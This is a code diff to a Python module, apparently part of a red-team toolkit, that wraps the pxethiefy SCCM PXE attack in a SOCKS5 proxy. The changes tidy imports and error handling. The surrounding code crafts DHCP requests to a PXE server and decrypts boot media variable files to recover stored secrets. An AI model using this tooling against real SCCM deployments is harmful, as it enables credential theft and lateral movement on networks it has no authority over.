@@ -3,11 +3,9 @@ import socket
 import time
 import os
 import xml.etree.ElementTree as ET
-from hashlib import *
-from scapy.all import *
+from hashlib import sha1
 import binascii
-from lib.socks import SOCKS5Client
-from Crypto.Cipher import AES,DES3
+from Crypto.Cipher import AES, DES3
 
 ## Most of the code here is taken from pxethiefy.py (we're just wrapping in SOCKS5), with thanks to the author!
 ## https://github.com/csandker/pxethiefy/blob/main/pxethiefy.py
@@ -19,6 +17,8 @@ class SCCM:
         self.socks_client = socks_client
 
     def _craft_packet(self, client_ip, client_mac):
+        from scapy.layers.dhcp import BOOTP, DHCP
+
         pkt = BOOTP(ciaddr=client_ip,chaddr=client_mac)/DHCP(options=[
             ("message-type","request"),
             ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
@@ -59,7 +59,7 @@ class SCCM:
                 variables_file = variables_file.decode('utf-8')
             bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
         else:
-            print("[!] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location", MSG_TYPE_ERROR)
+            print("[!] No variable file location (DHCP option 243) found in the received packet")
 
         return [variables_file,bcd_file,encrypted_key]
 
@@ -123,6 +123,8 @@ class SCCM:
         return new_key
 
     def send_bootp_request(self, client_ip, client_mac):
+        from scapy.layers.dhcp import BOOTP, DHCP
+
         self.socks_client.send(bytes(self._craft_packet(client_ip, client_mac)), (self.target, self.port))
         data = self.socks_client.recv(9076)
 
@@ -132,10 +134,15 @@ class SCCM:
         dhcp_layer = bootp_layer[DHCP]
         dhcp_options = dhcp_layer[DHCP].options
 
-        option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
+        opt243 = next((opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243), None)
+        if opt243 is None or not opt243[1]:
+            raise RuntimeError("No variable file location (DHCP option 243) in PXE server response")
 
-        if(variables_file and dhcp_options):
-            variables_file,bcd_file,encrypted_key = self._extract_boot_files(variables_file, dhcp_options)
+        variables_file = opt243[1]
+        variables_file, bcd_file, encrypted_key = self._extract_boot_files(variables_file, dhcp_options)
+
+        if not variables_file or not isinstance(variables_file, str):
+            raise RuntimeError("Failed to extract variable file path from DHCP response")
 
         return [variables_file, bcd_file, encrypted_key]
 
@@ -183,7 +190,7 @@ class SCCM:
         except UnicodeDecodeError:
             raise ValueError("Decryption produced invalid data — key is likely wrong")
         # Strip trailing nulls and non-printable chars
-        decrypted = decrypted[:decrypted.rfind('\x00')]
+        decrypted = decrypted[:decrypted.rfind('\x00')] if '\x00' in decrypted else decrypted
         return "".join(c for c in decrypted if c.isprintable())
 
     def _3des_decrypt(self, data, key):
